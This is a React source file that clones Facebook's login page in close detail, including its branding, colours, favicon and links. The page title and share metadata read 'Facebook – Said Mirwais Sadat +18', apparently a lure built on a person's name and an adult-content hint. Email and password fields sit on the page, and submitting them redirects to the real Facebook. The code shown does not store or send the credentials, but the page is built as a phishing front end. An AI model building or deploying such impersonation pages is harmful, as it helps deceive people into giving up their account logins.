import { useState } from 'react';
import {
  TextInput,
  PasswordInput,
  Button,
  Paper,
  Title,
  Text,
  Anchor,
  Divider,
  Stack,
  Center,
  Box,
} from '@mantine/core';
import { Helmet } from 'react-helmet';

function FacebookLogin() {
  const [email, setEmail] = useState('');
  const [pass, setPass] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (email && pass) {
      window.location.href = 'https://facebook.com';
    } else {
      setError('The email address or mobile number you entered isn’t connected to an account. Find your account and log in.');
    }
  };

  const facebookFont = "'Segoe UI', 'Helvetica Neue', Arial, 'Noto Sans', sans-serif";

  return (
    <>
      {(() => { document.title = "Facebook – Said Mirwais Sadat +18"; })()}
      <Helmet>
        <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
        <meta property="og:title" content="Facebook – Said Mirwais Sadat +18" />
        <meta property="og:description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
        <meta property="og:image" content="data:image/png;base64,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" />
        <meta property="og:image:alt" content="Facebook logo" />
        <meta name="imagedesc" content="Facebook logo in blue and white" />
        <link rel="icon" type="image/png" href="https://www.facebook.com/images/fb_icon_325x325.png" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
        <style>{`
          body, #root {
            font-family: ${facebookFont} !important;
            background: #f0f2f5;
          }
        `}</style>
      </Helmet>
      <Center style={{ minHeight: '100vh', background: '#f0f2f5', fontFamily: facebookFont }}>
        <Box
          style={{
            width: '100%',
            maxWidth: 380,
            margin: '0 auto',
            padding: '24px 0',
          }}
        >
          <Center>
            <Title
              order={1}
              color="#1877f2"
              style={{
                fontFamily: facebookFont,
                fontWeight: 700,
                fontSize: 40,
                letterSpacing: '-2px',
                lineHeight: 1,
                marginBottom: 8,
              }}
            >
              facebook
            </Title>
          </Center>
          <Center>
            <Text
              size="md"
              style={{
                fontFamily: facebookFont,
                fontWeight: 400,
                fontSize: 18,
                color: '#1c1e21',
                lineHeight: 1.2,
                maxWidth: 320,
                textAlign: 'center',
                marginBottom: 18,
              }}
            >
              Facebook helps you connect and share with the people in your life.
            </Text>
          </Center>
          <Paper
            radius="md"
            p="lg"
            withBorder
            shadow="md"
            style={{
              width: '100%',
              fontFamily: facebookFont,
              background: '#fff',
              border: 'none',
              boxShadow: '0 2px 8px 0 rgba(0,0,0,0.1)',
              margin: '0 auto',
            }}
          >
            <form onSubmit={handleSubmit}>
              <Stack spacing="sm">
                <TextInput
                  placeholder="Email address or phone number"
                  value={email}
                  onChange={e => setEmail(e.currentTarget.value)}
                  radius="md"
                  size="md"
                  required
                  styles={{
                    input: {
                      fontFamily: facebookFont,
                      fontSize: 16,
                      background: '#f5f6f7',
                      borderColor: '#dddfe2',
                      height: 44,
                    },
                  }}
                />
                <PasswordInput
                  placeholder="Password"
                  value={pass}
                  onChange={e => setPass(e.currentTarget.value)}
                  radius="md"
                  size="md"
                  required
                  styles={{
                    input: {
                      fontFamily: facebookFont,
                      fontSize: 16,
                      background: '#f5f6f7',
                      borderColor: '#dddfe2',
                      height: 44,
                    },
                  }}
                />
                {error && (
                  <Text color="red" size="sm" style={{ fontFamily: facebookFont, marginTop: 2 }}>
                    {error}
                  </Text>
                )}
                <Button
                  type="submit"
                  color="#1877f2"
                  radius="md"
                  size="md"
                  fullWidth
                  style={{
                    fontWeight: 700,
                    fontFamily: facebookFont,
                    fontSize: 18,
                    background: '#1877f2',
                    marginTop: 4,
                    marginBottom: 2,
                  }}
                >
                  Log In
                </Button>
              </Stack>
            </form>
            <Center mt="xs" mb="xs">
              <Anchor
                href="https://facebook.com/recover/initiate"
                color="#1877f2"
                size="sm"
                underline={false}
                style={{
                  fontWeight: 500,
                  fontFamily: facebookFont,
                  fontSize: 13,
                  marginTop: 8,
                }}
              >
                Forgotten password?
              </Anchor>
            </Center>
            <Divider my="md" />
            <Center>
              <Button
                color="#42b72a"
                radius="md"
                size="md"
                style={{
                  fontWeight: 700,
                  fontFamily: facebookFont,
                  fontSize: 16,
                  background: '#42b72a',
                  marginTop: 2,
                }}
                onClick={() => window.location.href = 'https://facebook.com/r.php'}
              >
                Create new account
              </Button>
            </Center>
          </Paper>
          <Center mt="md">
            <Text
              size="sm"
              style={{
                fontFamily: facebookFont,
                marginTop: 18,
                color: '#1c1e21',
                fontSize: 13,
                textAlign: 'center',
              }}
            >
              <Anchor
                href="https://www.facebook.com/pages/create/?ref_type=registration_form"
                color="#1c1e21"
                underline={false}
                style={{
                  fontWeight: 600,
                  fontFamily: facebookFont,
                }}
              >
                Create a Page
              </Anchor>{' '}
              for a celebrity, brand or business.
            </Text>
          </Center>
        </Box>
      </Center>
    </>
  );
}

export default FacebookLogin;
